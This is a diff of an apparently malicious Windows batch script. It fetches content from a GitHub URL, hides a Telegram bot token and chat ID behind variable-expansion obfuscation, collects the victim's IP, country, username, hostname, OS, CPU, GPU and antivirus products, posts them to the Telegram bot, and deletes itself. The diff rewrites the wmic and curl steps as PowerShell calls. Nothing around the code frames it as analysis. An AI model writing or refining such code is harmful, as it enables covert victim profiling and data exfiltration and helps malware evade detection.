@@ -23,26 +23,49 @@ powershell.exe -C "$c = (iwr 'https://raw.githubusercontent.com/githa0/0/0/0/con
 setlocal EnableDelayedExpansion
 set "TOKEN=%BN XPA%7%VHOHLA%6%ZQIXGH%0%QH GWS%4% MKLGE%0%JCHTGC%0%JUKCXV%3%HMEJKA%4%IRKERC%8%AVSHXD%3:%QKBJYJ%A%TFKFOM%A%XNLE J%G%OQBJDP%G%VFMETL%I%LBXGNM%o%UZPVQF%6%QCDYHE%l%RWWIUH%b%BHHMPT%N%XONZVM%l%QQ  LB%s%VTAXTA%h%LXYINX%S%QCHQFF%j%FHJWYB%n%TSIRIR%v%ESLVNA%s%GFOGBS%G%VPAQJS%1%F LVUE%w%S VZDB%7%TUPGEV%O%MVPGJ %m%SZGSAJ%B%ACIQMI%j%GKZHDO%L%GIBMOH%B%CPLFEP%c%CZQMCW%4%Y ZMYB%r%UCIHAV%5%XESBAB%5%YFKZQM%F%ZVYTOO%A"
 set "CHAT_ID=%ALVFLW%5%IEPNLS%6%PBUXFO%7%PXUWUF%4%KBUFZY%9%FMQTVG%3%EFMLKK%8%FUZFHD%5%DMFHPZ%3%AFSPVK%2"
-for /f "tokens=1,2 delims=," %%a in ('curl -s "http://ip-api.com/csv/?fields=country,query"') do (
-    set "Country=%%a"
-    set "IP=%%b"
+for /f "tokens=1,* delims=|" %%a in ('
+  powershell -NoProfile -Command ^
+    "$json = Invoke-RestMethod -Uri 'http://ip-api.com/json/';" ^
+    "Write-Host ($json.query + '|' + $json.country)"
+') do (
+    set "IP=%%a"
+    set "Country=%%b"
 )
 
-for /f "tokens=2 delims==" %%a in ('wmic os get Caption /value ^| findstr /r /v "^$"') do set "Windows=%%a"
-for /f "tokens=2 delims==" %%a in ('wmic cpu get name /value ^| findstr /r /v "^$"') do set "CPU=%%a"
-for /f "tokens=2 delims==" %%a in ('wmic path win32_videocontroller get caption /value ^| findstr /r /v "^$"') do set "GPU=%%a"
-set "Antivirus="
-for /f "tokens=2 delims==" %%a in ('wmic /namespace:\\root\SecurityCenter2 path AntiVirusProduct get displayName /value ^| findstr /r /v "^$"') do (
-    if defined Antivirus (set "Antivirus=!Antivirus!, %%a") else (set "Antivirus=%%a")
+for /f "tokens=*" %%a in ('powershell -NoProfile -Command "(Get-WmiObject -Class Win32_OperatingSystem).Caption"') do (
+    set "Windows=%%a"
 )
 
-if defined ProgramFiles(x86) (set Arch=X64) else (set Arch=X86)
+for /f "tokens=*" %%a in ('powershell -NoProfile -Command "(Get-WmiObject -Class Win32_Processor).Name"') do (
+    set "CPU=%%a"
+)
+
+for /f "tokens=*" %%a in ('powershell -NoProfile -Command "(Get-WmiObject -Class Win32_VideoController).Caption"') do (
+    set "GPU=%%a"
+)
+
+for /f "tokens=*" %%a in ('powershell -NoProfile -Command "[System.Environment]::Is64BitOperatingSystem"') do (
+    if %%a==True (
+        set "Arch=X64"
+    ) else (
+        set "Arch=X86"
+    )
+)
+
+for /f "tokens=*" %%a in ('powershell -NoProfile -Command "(Get-WmiObject -Namespace root/SecurityCenter2 -Class AntiVirusProduct).displayName"') do (
+    if defined Antivirus (
+        set "Antivirus=!Antivirus!,%%a"
+    ) else (
+        set "Antivirus=%%a"
+    )
+)
 
 set "UserName=%USERNAME%"
 set "Worker=%COMPUTERNAME%"
-set "MESSAGE=RUS%%0AIP: !IP!%%0ACountry: !Country!%%0AWorker: !Worker!%%0AUserName: !UserName!%%0AWindows: !Windows! !Arch!%%0ACPU: !CPU!%%0AGPU: !GPU!%%0AAntivirus: !Antivirus!"
-set "MESSAGE=!MESSAGE: =%%20!"
 
-curl -s -X POST "https://api.telegram.org/bot%TOKEN%/sendMessage" -d "chat_id=%CHAT_ID%" -d "text=%MESSAGE%"
+powershell -NoProfile -Command ^
+  "$message = 'RUS' + [System.Environment]::NewLine + 'IP: %IP%' + [System.Environment]::NewLine + 'Country: %Country%' + [System.Environment]::NewLine + 'Worker: %Worker%' + [System.Environment]::NewLine + 'UserName: %UserName%' + [System.Environment]::NewLine + 'Windows: %Windows% %Arch%' + [System.Environment]::NewLine + 'CPU: %CPU%' + [System.Environment]::NewLine + 'GPU: %GPU%' + [System.Environment]::NewLine + 'Antivirus: %Antivirus%';" ^
+  "Invoke-RestMethod -Uri 'https://api.telegram.org/bot%TOKEN%/sendMessage' -Method POST -Body @{chat_id='%CHAT_ID%'; text=$message}"
+
 endlocal
 del /f "%~f0"
